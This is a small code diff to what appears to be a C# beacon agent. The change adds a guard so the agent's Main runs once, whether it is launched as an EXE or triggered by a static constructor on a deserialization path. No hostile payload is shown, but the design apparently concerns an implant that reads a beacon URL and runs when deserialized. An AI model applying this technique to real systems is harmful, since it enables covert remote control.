@@ -30,8 +30,18 @@ namespace CSharpAgent
             Main();
         }
 
+        // The release EXE builds (csharp-agent-<net2|net4>-<arch>.exe siblings of the DLLs)
+        // reach this type through the runtime entry point, which calls Main AFTER the static
+        // ctor already did — without the guard a direct run would execute the body twice.
+        // The ctor's call is the ONLY entry the deserialization path has (a Library has no
+        // managed entry point), so both forms share the body; the guard makes it run exactly
+        // once either way.
+        static bool _entered;
+
         static void Main()
         {
+            if (_entered) return;
+            _entered = true;
             var beaconUrl = Environment.GetEnvironmentVariable("H_URL");
             if (string.IsNullOrEmpty(beaconUrl))
             {
